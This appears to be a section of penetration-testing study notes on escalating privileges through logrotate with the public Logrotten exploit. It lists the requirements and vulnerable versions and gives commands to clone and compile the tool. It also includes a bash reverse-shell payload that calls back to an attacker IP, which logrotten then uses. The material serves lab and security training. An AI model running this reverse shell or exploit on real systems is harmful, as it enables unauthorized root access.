### Logrotate conf file

```bash
cat /etc/logrotate.conf
```
We can find the corresponding configuration files in /etc/logrotate.d/ directory.

To exploit logrotate, we need some requirements that we have to fulfill.

 - we need write permissions on the log files
 - logrotate must run as a privileged user or root
 - vulnerable versions:
   + 3.8.6
   + 3.11.0
   + 3.15.0
   + 3.18.0

If these conditions are fulfilled, then there is a pre fabricated exploit [Logrotten](https://github.com/whotwagner/logrotten) to exploit this.


### Exploit
Download and complile the code on target system or system with similar kernel

```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```
Next, we need a payload to be executed. Here many different options are available to us that we can use. In this example, we will run a simple bash-based reverse shell with the IP and port of our VM that we use to attack the target system.

```bash
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```
Now there are two ways in which logrotate works, *create* or *compress*. There are different ways to explot those. For the create ones.

```bash
./logrotten -p ./payload /tmp/tmp.log
```
